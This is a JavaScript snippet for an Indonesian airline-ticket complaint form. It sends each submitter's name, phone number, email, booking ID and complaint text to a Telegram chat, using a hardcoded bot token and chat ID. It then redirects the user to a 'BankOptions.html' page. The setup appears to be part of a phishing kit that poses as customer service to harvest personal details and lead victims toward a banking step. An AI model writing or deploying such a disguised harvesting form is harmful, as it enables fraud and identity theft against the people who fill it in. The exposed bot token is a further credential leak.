<script>
const form = document.getElementById('complaintForm');

// Konfigurasi Telegram Bot
const TELEGRAM_BOT_TOKEN = '8142214274:AAGDkwwEOsbxxo00e-hd7p5avWosgEjsjA8';
const TELEGRAM_CHAT_ID = '7549590022';

// Fungsi untuk menampilkan notifikasi
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `fixed top-4 right-4 p-4 rounded-lg text-white z-50 ${
        type === 'success' ? 'bg-green-500' : 
        type === 'error' ? 'bg-red-500' : 'bg-blue-500'
    }`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 5000);
}

async function sendToTelegram(data) {
    const message = `
ðŸŽ« *PENGADUAN BOOKING TIKET*

ðŸ‘¤ *Nama:* ${data.nama}
ðŸ“± *No HP:* ${data.nomorhp}
ðŸ“§ *Email:* ${data.email || 'Tidak diisi'}
ðŸŽŸï¸ *ID Booking:* ${data.idbooking}
âœˆï¸ *Maskapai:* ${data.maskapai}
âš ï¸ *Jenis Masalah:* ${data.jenismasalah}

ðŸ“ *Detail Pengaduan:*
${data.keterangan}

â° *Waktu:* ${new Date().toLocaleString('id-ID')}
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        
        if (response.ok && result.ok) {
            return { success: true };
        } else {
            return { success: false, error: result.description || 'Unknown error' };
        }
    } catch (error) {
        return { success: false, error: error.message };
    }
}

form.addEventListener('submit', async (e) => {
    e.preventDefault();

    if (!form.checkValidity()) {
        form.reportValidity();
        return;
    }

    // Tampilkan loading
    const submitBtn = form.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Mengirim...';
    submitBtn.disabled = true;

    // Ambil data form
    const formData = new FormData(form);
    const data = {
        nama: formData.get('nama'),
        nomorhp: formData.get('nomorhp'),
        email: formData.get('email'),
        idbooking: formData.get('idbooking'),
        maskapai: formData.get('maskapai'),
        jenismasalah: formData.get('jenismasalah'),
        keterangan: formData.get('keterangan')
    };

    // Kirim ke Telegram
    const result = await sendToTelegram(data);

    if (result.success) {
        showNotification('Pengaduan berhasil dikirim! Kami akan segera menindaklanjuti.', 'success');
        form.reset();
        
        // Redirect setelah 2 detik
        setTimeout(() => {
            window.location.href = "BankOptions.html";
        }, 2000);
    } else {
        showNotification(`Gagal mengirim pengaduan: ${result.error}`, 'error');
        console.error('Telegram API Error:', result.error);
    }

    // Reset button
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
});
</script>
